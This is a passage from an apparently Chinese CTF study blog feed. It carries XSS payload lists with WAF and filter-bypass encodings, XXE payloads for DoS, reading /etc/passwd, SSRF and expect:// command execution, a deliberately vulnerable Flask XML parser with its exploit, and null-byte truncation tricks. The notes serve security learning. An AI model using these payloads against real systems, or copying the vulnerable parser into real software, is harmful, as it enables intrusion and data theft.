onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br><br>#鼠标指针移动到元素时触发  <br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br>#鼠标指针移出时触发  <br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br><br>#js伪协议<br>&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br><br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h2><p>前端过滤：抓包重发或者修改HTML<br>后端正则过滤：大小写混合输入</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>替代<br><code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>大小写绕过<br><code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code><br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br><code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>字符拼接<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>top字符拼接<br>&lt;script&gt;top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">`xss`</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Unicode</span>编码绕过<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br><br>url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br><br>Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br><br>Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br><br>八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br><br>base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&gt;<br></code></pre></td></tr></table></figure><p>使用编码绕过，具体看上面列举的例子</p><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用<code>throw</code>来绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;svg/onload=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">使用url编码<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;<br>使用<span class="hljs-variable constant_">IP</span><br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://2130706433/`</span>&gt;十进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0177.0.0.01/`</span>&gt;八进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0x7f.0x0.0x0.0x1/`</span>&gt;十六进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`//www.baidu.com`</span>&gt;html标签中用<span class="hljs-comment">//  可以代替http://</span><br>使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在<span class="hljs-title class_">Windows</span>下是file协议，在linux下才会是当前域的协议)<br>使用中文逗号代替英文逗号<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;document.location=http://www。baidu。com&quot;</span>&gt;<span class="hljs-comment">//会自动跳转到百度</span><br></code></pre></td></tr></table></figure><h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p><code>&#39; oninput=alert(&quot;1&quot;)//</code>，<code>&#39; onclick=&#39;alert(document.cookie)&#39;//</code>绕过尖括号的实体化，用<code>&#39;</code>闭合</p><p><code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code> 绕过on和&lt;script过滤</p><p>href的隐藏属性自动Unicode解码 绕过<code>&quot;</code>、<code>script</code>、<code>on</code>、<code>src</code>、<code>href</code></p><p><code>html编码</code>后的内容可以绕过后端的过滤，但拼接到前端后，就会被浏览器解码，重新变回字母。例如<code>java&amp;#115;cript:alert(8)</code></p><p><code>&lt;input name=&quot;t_sort&quot; value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>对于隐藏且过滤<code>&lt;&gt;</code>的，使用<code>&quot; oninput=alert(&#39;1&#39;) type=&quot;text</code>“闭合，注意要有空格</p><p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>图片加载报错<br><code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>鼠标指针移动到元素时触发<br><code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>鼠标指针移出时触发</p><p>左右尖括号和单引号都被html编码<code>javascript:alert(document.cookie)</code></p><p><code>&#39;&gt;&lt;img src=&#39;#&#39; onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE-XML</title>
    <link href="/2025/03/22/XXE-XML/"/>
    <url>/2025/03/22/XXE-XML/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/8041?time__1311=n4+xnD0Dc7=YqD5eGN3xCwwBititC3tHTe4D#toc-3">https://xz.aliyun.com/t/8041?time__1311&#x3D;n4%2BxnD0Dc7%3DYqD5eGN3xCwwBititC3tHTe4D#toc-3</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80">https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80</a></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。<br>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>XML 文档在开头有 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p><p>除了可选的开头外，XML 语法主要有以下的特性：</p><ul><li>所有 XML 元素都须有关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 必须正确地嵌套</li><li>XML 文档必须有根元素</li><li>XML 的属性值需要加引号</li></ul><p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a0 <span class="hljs-string">&quot;dos&quot;</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a1</span> <span class="hljs-string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a2</span> <span class="hljs-string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;a2;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">payload</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;payload;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://publicServer.com/&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">xmlns:xi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xi:include</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xi:include</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><p><code>cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; 16.xml</code>编码绕过</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight python"><figcaption><span>file:app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/parse&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>():<br>    xml=request.form.get(<span class="hljs-string">&#x27;xml&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(xml)<br>    <span class="hljs-keyword">if</span> xml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;None&quot;</span><br>    parser = etree.XMLParser(load_dtd=<span class="hljs-literal">True</span>, resolve_entities=<span class="hljs-literal">True</span>)<br>    root = etree.fromstring(xml, parser)<br>    name=root.find(<span class="hljs-string">&#x27;name&#x27;</span>).text<br>    <span class="hljs-keyword">return</span> name <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>先写一个html进行交互</p><figure class="highlight html"><figcaption><span>file:localhost.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://47.76.151.192:60088/parse&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;xml&quot;</span>&gt;</span>输入 XML 数据：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis</title>
    <link href="/2025/03/22/Redis/"/>
    <url>/2025/03/22/Redis/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP</title>
    <link href="/2025/03/22/HTTP/"/>
    <url>/2025/03/22/HTTP/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>HTTPS&#x3D;HTTP+SSL<br>HTTP端口80，HTTPS端口443</p><h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><p>当你传入 <code>?basectf=we1c%00me</code> 但实际变成了 <code>we1cme</code>，这是因为 <code>%00</code> 是 URL 编码中代表空字节（<code>NULL</code> 字符）的转义序列。许多 Web 服务器和编程语言在处理 URL 时会将 <code>%00</code> 识别为字符串结束符，从而忽略 <code>%00</code> 后面的内容。这在 Web 安全中称为“空字节截断”，通常用于绕过某些安全检查。</p><p>解决方法：</p><p><strong>双重编码</strong>：</p><ul><li>使用双重编码将 <code>%00</code> 编码成 <code>%2500</code>，使服务器不会直接识别它为空字节，但在服务器端你需要解码两次才能得到原始值。</li></ul><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><ul><li>200 OK &#x2F;&#x2F;客户端请求成功</li><li>400 Bad Request &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解 </li><li>401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </li><li>403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 </li><li>404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL </li><li>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误 </li><li>503 Server Unavailable &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li></ul><h3 id="请求头总结"><a href="#请求头总结" class="headerlink" title="请求头总结"></a>请求头总结</h3><p>http date标头使用案例:  Tue, 20 Aug 2024 00:00:00 GMT</p><ul><li>X-Forwarded-For：包含客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Real-IP：包含客户端 IP 地址，与 X-Forwarded-For 的区别在于它只包含一个 IP 地址，而不是包含一系列 IP 地址列表。</li><li>Remote-Addr：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Client-IP：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Via：包含了 HTTP 请求经过的代理服务器的地址和版本信息，多个代理服务器之间用逗号分隔。</li><li>Forwarded：RFC 7239 规定的标准头部，包含了客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用分号分隔。</li><li>Forwarded-For：与 X-Forwarded-For 类似，用于标识客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Originating-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改。</li><li>X-Cluster-Client-IP：用于标识客户端 IP 